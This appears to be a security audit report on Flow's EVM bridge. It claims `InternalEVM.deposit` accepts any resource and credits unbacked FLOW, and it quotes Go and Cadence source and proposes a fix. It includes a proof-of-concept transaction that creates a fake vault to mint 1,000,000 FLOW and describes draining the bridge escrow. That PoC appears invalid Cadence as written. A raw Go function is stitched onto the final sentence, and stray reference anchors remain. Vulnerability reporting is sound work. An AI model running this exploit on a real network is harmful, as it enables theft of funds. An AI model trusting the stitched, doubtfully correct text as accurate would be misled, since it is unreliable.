### Title
`InternalEVM.deposit` Accepts `AnyResource` Instead of `@FlowToken.Vault`, Enabling Fake-Vault EVM Balance Inflation — (`File: fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

---

### Summary

The native `InternalEVM.deposit` function declares its `from` parameter as `sema.AnyResourceType` rather than `@FlowToken.Vault`. The Go-side implementation reads only the `balance: UFix64` field from whatever composite value is passed, then constructs a fresh `types.FLOWTokenVault` and credits the target EVM address with that amount — without ever verifying that the resource is a real `FlowToken.Vault` or that any real FLOW tokens were actually transferred. Because `InternalEVM` is a public native contract (all members registered as `sema.NewUnmeteredPublicFunctionMember`), any Cadence transaction or contract author can import it directly and bypass the `@FlowToken.Vault` type-gate that the `EVM.cdc` wrapper enforces.

---

### Finding Description

**Root cause — type declaration (`fvm/evm/stdlib/contract.go`):**

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType), // ← AnyResource, not @FlowToken.Vault
        },
        ...
    },
}
``` [1](#0-0) 

**Root cause — implementation (`fvm/evm/impl/impl.go`):**

The Go handler reads the `balance` field from whatever composite value arrives, constructs a synthetic `FLOWTokenVault`, and deposits it — no type identity check is performed:

```go
fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
amountValue, ok := fromValue.GetField(context, fungibleTokenVaultTypeBalanceFieldName).(interpreter.UFix64Value)
amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))
account.Deposit(types.NewFlowTokenVault(amount))
``` [2](#0-1) 

**The safe wrapper that is bypassed (`fvm/evm/stdlib/contract.cdc`):**

The public `EVM.cdc` `deposit` function on `EVMAddress` correctly requires `@FlowToken.Vault`:

```cadence
fun deposit(from: @FlowToken.Vault) {
    InternalEVM.deposit(from: <-from, to: self.bytes)
}
``` [3](#0-2) 

Because `InternalEVM.deposit` is `access(all)` and `InternalEVM` is deployed at the well-known service-account address, any Cadence transaction can import `InternalEVM` directly and call `deposit` with a crafted resource, skipping the `@FlowToken.Vault` constraint entirely.

---

### Impact Explanation

An attacker who calls `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddr)` with a custom resource whose `balance` field is set to an arbitrarily large `UFix64` value will have that amount credited to their EVM address as FLOW. No real `FlowToken.Vault` is consumed. This breaks the 1:1 peg between Cadence FLOW and EVM FLOW, allows the attacker to withdraw real FLOW via `CadenceOwnedAccount.withdraw`, and drains the EVM native-token bridge escrow — a direct cross-VM asset loss.

---

### Likelihood Explanation

Any unprivileged Cadence transaction author can import `InternalEVM` (a public native contract at the service-account address) and call `deposit` directly. No special keys, staked nodes, or admin access are required. The attack requires only the ability to submit a Cadence transaction, which is open to all network participants.

---

### Recommendation

Change the `from` parameter type in `InternalEVMTypeDepositFunctionType` from `sema.AnyResourceType` to the concrete `FlowToken.Vault` sema type, mirroring the constraint already enforced in the `EVM.cdc` wrapper:

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(flowTokenVaultSemaType), // @FlowToken.Vault
        },
        ...
    },
}
```

Additionally, the Go implementation should assert `fromValue.QualifiedIdentifier() == "FlowToken.Vault"` before reading the balance field, providing defence-in-depth at the interpreter layer.

---

### Proof of Concept

```cadence
import InternalEVM from <serviceAccountAddress>

transaction {
    execute {
        // FakeVault is a resource with only a `balance` field — no real FLOW inside
        let fakeVault <- create FakeVault(balance: 1_000_000.0)

        // Directly calls InternalEVM.deposit, bypassing EVM.cdc's @FlowToken.Vault gate
        InternalEVM.deposit(
            from: <-fakeVault,
            to: [/* attacker EVM address bytes */]
        )
        // Attacker's EVM address is now credited with 1,000,000 FLOW
    }
}

resource FakeVault {
    var balance: UFix64
    init(balance: UFix64) { self.balance = balance }
}
```

The `InternalEVM.deposit` Go handler accepts the `FakeVault` (it is a `*interpreter.CompositeValue`), reads `balance = 1_000_000.0`, and calls `account.Deposit(types.NewFlowTokenVault(amount))`, crediting the EVM account with 1,000,000 FLOW without any real tokens being transferred. func newInternalEVMTypeDepositFunction(
	gauge common.MemoryGauge,
	handler types.ContractHandler,
) *interpreter.HostFunctionValue {
	return interpreter.NewStaticHostFunctionValue(
		gauge,
		stdlib.InternalEVMTypeDepositFunctionType,
		func(invocation interpreter.Invocation) interpreter.Value {
			context := invocation.InvocationContext

			// Get from vault

			fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amountValue, ok := fromValue.GetField(
				context,
				fungibleTokenVaultTypeBalanceFieldName,
			).(interpreter.UFix64Value)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))

			// Get to address

			toAddressValue, ok := invocation.Arguments[1].(*interpreter.ArrayValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			toAddress, err := AddressBytesArrayValueToEVMAddress(context, toAddressValue)
			if err != nil {
				panic(err)
			}

			// NOTE: We're intentionally not destroying the vault here,
			// because the value of it is supposed to be "kept alive".
			// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
			// and a withdrawal would then have to perform an actual mint of new tokens.

			// Deposit

			const isAuthorized = false
			account := handler.AccountByAddress(toAddress, isAuthorized)
			account.Deposit(types.NewFlowTokenVault(amount))

			return interpreter.Void
		},
	)
